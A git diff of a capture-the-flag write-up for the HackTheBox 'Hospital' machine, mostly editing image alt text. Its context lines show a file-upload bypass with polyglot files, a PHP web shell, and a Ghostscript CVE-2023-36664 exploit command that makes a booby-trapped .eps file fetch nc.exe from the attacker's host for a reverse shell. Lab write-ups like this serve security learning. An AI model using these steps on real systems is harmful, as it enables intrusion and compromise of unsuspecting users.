@@ -184,7 +184,7 @@ Meanwhile I did gobuster to enumerate, and I seen 3 other subdomain
 
 ``gobuster dns -d hospital.htb -r hospital.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt``
 
-![Alt text](Hos_Pic/image.png) 
+![](Hos_Pic/image.png) 
 
 
 We also run a path enumeration with dirsearch to find our first entry point. Other port enumerations yielded no fruitful results, no users for ASREPRoastable enumeration, LDAP enumeration impossible (both null and anonymous sessions), no transfers on port 53, and IPv6 address can be disregarded.
@@ -192,35 +192,35 @@ We also run a path enumeration with dirsearch to find our first entry point. Oth
 ``dirsearch -u http://dc.hospital.htb:8080 --exclude-status 400,401,402,403,404,500,501,502,503,504``
 
 
-![Alt text](Hos_Pic/image-2.png)
+![](Hos_Pic/image-2.png)
 
 Port 443 is open, but after multiple attempts to bypass authentication, reading code, we'll leave it for later. It may prove useful in the future.
 
 
 
 
-![Port 443 ](Hos_Pic/image-8.png)
+![Port 443](Hos_Pic/image-8.png)
 
 
 
-![Alt text](Hos_Pic/image-1.png)
+![](Hos_Pic/image-1.png)
 
 
 Once connected, we can upload files, which seems promising as it's the only functionality available after login. This appears to be the only path forward.
 
-![Alt text](Hos_Pic/image-3.png)
+![](Hos_Pic/image-3.png)
 
 
 
 When uploading a PNG, GIF, or JPEG file, we're redirected to **success.php.**; otherwise, to .**failed.php.**\
 After some research, we can bypass this with what's known as a *"polyglot file".*
 
-![Alt text](Hos_Pic/image-4.png) 
+![](Hos_Pic/image-4.png) 
 
 
-![Alt text](Hos_Pic/image-5.png) aussi pour extension phps / pgif
+![](Hos_Pic/image-5.png) aussi pour extension phps / pgif
 
-![Alt text](Hos_Pic/image-7.png)
+![](Hos_Pic/image-7.png)
 
 These article help me a lot : \
 https://book.hacktricks.xyz/pentesting-web/file-upload#file-upload-general-methodology
@@ -233,10 +233,10 @@ After injecting a PHP reverse shell, it was impossible to establish an incoming 
 Due to I/O error system
 
 
-![Alt text](Hos_Pic/image-9.png)
+![](Hos_Pic/image-9.png)
 
 
-![Alt text](Hos_Pic/image-6.png)
+![](Hos_Pic/image-6.png)
 
 https://medium.com/@tushar_rs_/remote-command-execution-through-file-upload-rce-3e72cb178bb8 --> https://github.com/flozz/p0wny-shell
 
@@ -244,11 +244,11 @@ https://medium.com/@tushar_rs_/remote-command-execution-through-file-upload-rce-
 
 However, an IO problem becomes evident from the screenshot, rendering the attainment of a reverse shell unattainable. Consequently, we opt to employ P0nyshell to address this issue effectively.
 
-![Alt text](Hos_Pic/image-10.png)
+![](Hos_Pic/image-10.png)
 
  
 
-![Alt text](Hos_Pic/image-11.png)
+![](Hos_Pic/image-11.png)
 
 ## First FootHold 
 
@@ -340,10 +340,12 @@ After reading the email, it is clear that we need to send him a .eps file. Fortu
 To accomplish this, we ensure that the target machine has Netcat installed, so we send it first, and then proceed to use the sent file (Netcat) to execute commands.
 
 
-
+Some ref : \
 https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection.git
 
 https://www.youtube.com/watch?v=Gh-A49rqrJI&ab_channel=%C3%81kosJakab
+
+
 
 ```bash
 python3 CVE_2023_36664_exploit.py --inject --payload "curl http://10.10.14.7/nc.exe -o nc.exe" --filename file.eps
@@ -366,7 +368,7 @@ We patiently wait for her to open the email,
 
 and we obtain a reverse shell.
 
-![got revershell as DrBrown](image-5.png)
+![Got revershell as DrBrown](image-5.png)
 
 
 ##  2<sup>nd</sup> Privilege Esclation
